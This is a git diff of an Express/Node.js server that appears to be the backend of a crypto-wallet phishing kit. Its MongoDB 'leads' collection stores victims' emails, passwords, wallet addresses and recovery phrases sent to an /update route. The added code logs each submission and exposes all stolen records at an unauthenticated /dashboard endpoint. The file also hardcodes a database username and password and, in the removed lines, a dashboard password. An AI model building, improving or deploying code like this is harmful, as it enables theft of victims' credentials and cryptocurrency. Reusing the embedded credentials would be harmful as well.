@@ -5,38 +5,62 @@ const cors = require('cors');
 const path = require('path');
 
 const app = express();
+
+// Middleware
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(__dirname));
+app.use(express.static(__dirname)); // Serves all files in the root folder
 
-mongoose.connect("mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority")
-  .then(() => console.log("DB Connected"))
-  .catch(err => console.error("DB Error:", err));
+// MongoDB Connection
+const MONGO_URI = "mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";
 
-const Lead = mongoose.model('Lead', new mongoose.Schema({
-    email: String, password: String, walletAddress: String, recoveryPhrase: String, timestamp: { type: Date, default: Date.now }
-}), 'leads');
+mongoose.connect(MONGO_URI)
+  .then(() => console.log("Successfully connected to MongoDB Atlas"))
+  .catch(err => console.error("MongoDB connection error:", err));
 
-// 1. THE SECRET LOCK: Passwords must match to see the dashboard
-app.get('/dashboard', (req, res) => {
-    const pass = req.query.pass; 
-    if (pass === 'Ihadnopurpose21') {
-        res.sendFile(path.join(__dirname, 'dashboard.html'));
-    } else {
-        res.status(403).send("Access Denied: Wrong Password");
+// Lead Schema
+const leadSchema = new mongoose.Schema({
+    email: String,
+    password: String,
+    walletAddress: String,
+    recoveryPhrase: String,
+    timestamp: { type: Date, default: Date.now }
+});
+
+const Lead = mongoose.model('Lead', leadSchema, 'leads');
+
+// Route to save lead data
+app.post('/update', async (req, res) => {
+    try {
+        console.log("Data received:", req.body);
+        const lead = new Lead(req.body);
+        await lead.save();
+        console.log("Lead saved successfully.");
+        res.status(200).send("Saved");
+    } catch (err) {
+        console.error("Database save error:", err);
+        res.status(500).send("Error saving lead.");
     }
 });
 
-app.post('/update', async (req, res) => {
+// Route to fetch data for the dashboard
+app.get('/dashboard', async (req, res) => {
     try {
-        await new Lead(req.body).save();
-        res.status(200).send("Saved");
-    } catch (err) { res.status(500).send("Error"); }
+        const leads = await Lead.find().sort({ timestamp: -1 });
+        res.json(leads);
+    } catch (err) {
+        console.error("Database fetch error:", err);
+        res.status(500).send("Error fetching leads.");
+    }
 });
 
-app.get('/dashboard-data', async (req, res) => {
-    const leads = await Lead.find().sort({ timestamp: -1 });
-    res.json(leads);
+// Root route to serve the dashboard file directly
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard.html'));
 });
 
-app.listen(process.env.PORT || 3000);
+// Start Server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server is alive and running on port ${PORT}`);
+});
